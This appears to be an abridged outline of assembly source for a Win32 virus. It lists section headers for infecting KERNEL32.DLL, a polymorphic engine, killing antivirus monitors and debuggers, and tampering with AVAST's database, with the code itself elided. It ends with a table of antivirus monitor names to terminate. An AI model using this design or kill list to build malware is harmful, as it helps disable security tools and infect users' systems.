...
;───┤ function to hook some funtions from KERNEL32.DLL ├──────────────────
...
;───┤ function to actualize compressed programs ├─────────────────────────
...
;───┤ function to Win32 Cryptography APIs startup ├───────────────────────
...
;───┤ function to get cryptography key ├──────────────────────────────────
...
;───┤ do NOT crypted DLL checking - name check and registry ├─────────────
...
;───┤ functions to calculate brute-CRC64 and CRC32 for APIs ├─────────────
...
;───┤ function to add dropper to table ├──────────────────────────────────
...
;───┤ function to change AVAST's viruses database ├───────────────────────
...
;───┤ anti-bait: do not infect AV files ├─────────────────────────────────
...
;───┤ function to check if file has been infected ├───────────────────────
...
;───┤ function to kill some AV monitors ├─────────────────────────────────
...
;───┤ function to kill some debuggers ├───────────────────────────────────
...
;───┤ function to infect KERNEL32.DLL ├───────────────────────────────────
...
;───┤ start HyperInfection inside KERNEL32.DLL ├──────────────────────────
...
;───┤ finish HyperInfection inside KERNEL32.DLL ├─────────────────────────
...
;───┤ Prizzy Polymorphic Engine II (PPE-II) ├─────────────────────────────
...
;───┤ polymorphic garbages PPE-II ├───────────────────────────────────────
;───┤ generate some garbages code ├───────────────────────────────────────
...
;───┤ generate layer gaps (anti-heuristic) ├──────────────────────────────
...
;───┤ function to build brute-multi-layer-poly decoder ├──────────────────
...
;───┤ function to check multi-layers gaps ├───────────────────────────────
...
;───┤ function to jump to 3rd decoding loop ├─────────────────────────────
...
;───┤ function to create multi-layer buffer ├─────────────────────────────
...
;───┤ functions returns (empty) base reg ├────────────────────────────────
...
kill_AV 	equ	this byte
		...
		db	'Avast32 -- Rezidentnφ podpora',0	;AVAST32 (CZ)
		db	'AVP Monitor',0 			;AVP
		db	'Amon Antivirus Monitor',0		;AMON English
		db	'Antivφrusov² monitor Amon',0		;AMON Slovak
